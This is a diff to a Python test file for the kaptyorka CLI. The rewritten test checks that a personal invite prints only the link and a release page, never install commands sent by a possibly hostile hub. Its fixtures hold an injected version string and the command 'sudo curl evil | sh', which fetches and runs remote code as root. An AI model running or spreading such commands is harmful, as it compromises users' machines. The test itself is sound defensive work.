@@ -126,15 +126,20 @@ def test_cli_invite_prints_url(monkeypatch, home, capsys):
     assert calls[1] == ("POST", "http://h:1/api/invites", "adm", {"person": "ann"})
 
 
-def test_cli_personal_invite_prints_the_hubs_two_install_commands(monkeypatch, home, capsys):
+def test_cli_personal_invite_prints_the_link_and_the_release_page_never_a_command(monkeypatch, home, capsys):
+    """Finding 5a: the hub's answer carries only its version; the sentence is the CLI's own, so a
+    hostile hub cannot make it print a command."""
     paths.save_config({"hub": "https://h:1", "token": "adm", "machine": "pc"})
     link = "https://h:1/i/" + "C" * 22 + "#sha256=" + "ab" * 32
-    cmds = ["curl -fLO https://example.invalid/x.pyz", "echo 'ff  x.pyz' | sha256sum -c && sudo python3 -I x.pyz install --personal '" + link + "'"]
-    monkeypatch.setattr(http, "request", lambda m, url, *a, **k: (409, "exists") if url.endswith("/api/people")
-                        else (200, {"code": "C" * 22, "url": link, "install": cmds}))
-    assert entry_with_exit(["invite", "ann", "--personal"]) == 0
-    out = capsys.readouterr().out
-    assert "never `kaptyorka join`" in out and ("  " + cmds[0]) in out and ("  " + cmds[1]) in out
+    for ver, page in (("0.9.40", "https://github.com/narek-mn/kaptyorka/releases/tag/v0.9.40"),
+                      ("1; sudo curl evil | sh", "https://github.com/narek-mn/kaptyorka/releases:")):
+        monkeypatch.setattr(http, "request", lambda m, url, *a, **k: (409, "exists") if url.endswith("/api/people")
+                            else (200, {"code": "C" * 22, "url": link, "version": ver,
+                                        "install": ["sudo curl evil | sh"]}))
+        assert entry_with_exit(["invite", "ann", "--personal"]) == 0
+        out = capsys.readouterr().out
+        assert "never `kaptyorka join`" in out and f"  link: {link}\n" in out and page in out
+        assert "sudo" not in out and "evil" not in out and "sha256sum" not in out
 
 
 def test_cli_invite_not_admin(monkeypatch, home, capsys):
